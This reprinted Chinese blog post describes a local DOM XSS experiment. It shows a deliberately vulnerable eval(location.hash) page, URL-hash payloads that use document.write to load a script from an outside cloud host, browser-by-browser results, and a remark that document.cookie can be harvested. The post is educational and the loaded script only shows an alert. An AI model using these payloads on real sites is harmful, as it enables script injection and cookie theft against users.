---
title: '记一次简单的DOM XSS攻击实验' 
date: 2018-12-24 2:30:06
hidden: true
slug: jhctflrvqva
categories: [reprint]
---

{{< raw >}}

                    
<p>之前就对XSS有所耳闻，不过昨天在学习《深入浅出nodejs》过程中，才深入了解到XSS攻击的原理，于是找到那本很早就想看的《web前端黑客技术解密》，找到 跨站攻击脚本XSS 章节，于是有了下面这个简单的XSS攻击实验。</p>
<h4>index.html</h4>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<!DOCTYPE html>
<html>
<head>
    <meta charset=&quot;utf-8&quot;>
    <title>XSSdemo</title>
</head>
<script>
    eval(location.hash.substr(1))
</script>
<body>
    
</body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSSdemo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-built_in">eval</span>(location.hash.substr(<span class="hljs-number">1</span>))
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>关键代码：eval(location.hash.substr(1))</p>
<h4>xss.js（XSS攻击脚本，存储在七牛云上：<a href="http://ov6jc8fwp.bkt.clouddn.com/xss.js" rel="nofollow noreferrer" target="_blank">http://ov6jc8fwp.bkt.clouddn....</a>）</h4>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="alert(&quot;你的网站被XSS攻击了！&quot;)" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs stylus"><code style="word-break: break-word; white-space: initial;"><span class="hljs-function"><span class="hljs-title">alert</span><span class="hljs-params">(<span class="hljs-string">"你的网站被XSS攻击了！"</span>)</span></span></code></pre>
<p>关键代码：alert("你的网站被XSS攻击了！")<br>Cookie被经常当作输入点，可以使用escape(document.cookie)来获取用户Cookie中保存的敏感信息，例如电话号码，密码等等。</p>
<h4>如何进行攻击？</h4>
<p>待访问文件xss.html的url上加上hash值。<br><code>#document.write("&lt;script/src=//http://ov6jc8fwp.bkt.clouddn.com/xss.js&gt;&lt;/script&gt;")</code></p>
<p>例如：<br>file:///C:/Users/jack/Desktop/XSSdemo/index.html#document.write("&lt;script/src=//<a href="http://ov6jc8fwp.bkt.clouddn.com/xss.js&amp;gt" rel="nofollow noreferrer" target="_blank">http://ov6jc8fwp.bkt.clouddn....</a>;&lt;/script&gt;")</p>
<p>在真实环境中，这段file:///C:/Users/jack/Desktop/XSSdemo/可以是<a href="http://192.168.32.89" rel="nofollow noreferrer" target="_blank">http://192.168.32.89</a>:80/，<a href="http://192.16.32.89" rel="nofollow noreferrer" target="_blank">http://192.16.32.89</a>:8080/等真实地址。<br>完整形式如：<a href="http://192.16.32.89" rel="nofollow noreferrer" target="_blank">http://192.16.32.89</a>:8080/index.html#document.write("&lt;script/src=//<a href="http://ov6jc8fwp.bkt.clouddn.com/xss.js&amp;gt" rel="nofollow noreferrer" target="_blank">http://ov6jc8fwp.bkt.clouddn....</a>;&lt;/script&gt;")</p>
<h5>可以攻击Chrome吗?</h5>
<p>在Chrome中输入</p>
<blockquote><p>file:///C:/Users/jack/Desktop/XSSdemo/index.html#document.write(&lt;script/src=//<a href="http://ov6jc8fwp.bkt.clouddn.com/xss.js&amp;gt" rel="nofollow noreferrer" target="_blank">http://ov6jc8fwp.bkt.clouddn....</a>;&lt;/script&gt;")</p></blockquote>
<p>会被Chrome拦截，拦截截图如下：</p>
<p><span class="img-wrap"><img data-src="/img/remote/1460000012253324?w=705&amp;h=458" src="https://static.alili.tech/img/remote/1460000012253324?w=705&amp;h=458" alt="" title="" style="cursor: pointer; display: inline;"></span></p>
<p>为什么会被拦截？<br>因为Chrome 的filter防御机制会导致这个无法成功，其它浏览器可以被攻击。</p>
<h5>那么如何攻击FireFox呢？</h5>
<p>（浏览器版本为Firefox 57.0 Quantum版）<br>需要对原始攻击代码做下简单调整。<br><code>eval(decodeURI(location.hash.substr(1)))</code><br>相应的访问链接也更改为<code>file:///C:/Users/jack/Desktop/XSSdemo/index.html#document.write(&lt;script/src=http://ov6jc8fwp.bkt.clouddn.com/xss.js&gt;&lt;/script&gt;")</code></p>
<p>XSS攻击FireFox成功！<br><span class="img-wrap"><img data-src="/img/remote/1460000012253325?w=965&amp;h=432" src="https://static.alili.tech/img/remote/1460000012253325?w=965&amp;h=432" alt="" title="" style="cursor: pointer; display: inline;"></span><br>可以看到，XSS脚本被成功写入到index.html<br><span class="img-wrap"><img data-src="/img/remote/1460000012253326?w=965&amp;h=429" src="https://static.alili.tech/img/remote/1460000012253326?w=965&amp;h=429" alt="" title="" style="cursor: pointer; display: inline;"></span></p>
<h5>IE可以被攻击吗？</h5>
<p>（浏览器版本为IE11.726.15063.0 ）<br>XSS攻击IE11成功！<br><span class="img-wrap"><img data-src="/img/remote/1460000012253327" src="https://static.alili.tech/img/remote/1460000012253327" alt="" title="" style="cursor: pointer; display: inline;"></span></p>
<p>攻击了这么久，难道我是要去绿，哦不，黑别人吗？<br>NoNoNo，我是为了让自己的网站更加安全。</p>
<p>之前有了解到javascript的eval()会有安全问题，通过今天的例子，才明白eval()原来会帮助 XSS攻击输入点代码进行攻击，例如：<br>本例中的输入点为location.hash.substr(1)，其值为'document.write(&lt;script/src=<a href="http://ov6jc8fwp.bkt.clouddn.com/xss.js&amp;gt" rel="nofollow noreferrer" target="_blank">http://ov6jc8fwp.bkt.clouddn....</a>;&lt;/script&gt;")'</p>
<p>本质上eval(decodeURI(location.hash.substr(1)))<br>其实就是执行了eval'(document.write(`&lt;script/src=<a href="http://ov6jc8fwp.bkt.clouddn.com/xss.js&amp;gt" rel="nofollow noreferrer" target="_blank">http://ov6jc8fwp.bkt.clouddn....</a>;&lt;/script&gt;")')</p>
<p>简单来说，<strong>eval()会执行XSS跨站攻击脚本</strong>，前端工程师在开发过程中要注意eval()使用存在的安全隐患。</p>
<p>对于浏览器喜爱程度，我想Chrome在防御XSS攻击方面又为自己加了不少分，以后强推Chrome又多了一个理由。</p>
<p>其实关于XSS攻击还有很多学问在其中，我所了解到的只是冰山一角，后续再继续探索！</p>
<p>That's it !</p>

                
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
记一次简单的DOM XSS攻击实验

## 原文链接
[https://segmentfault.com/a/1190000012253319](https://segmentfault.com/a/1190000012253319)

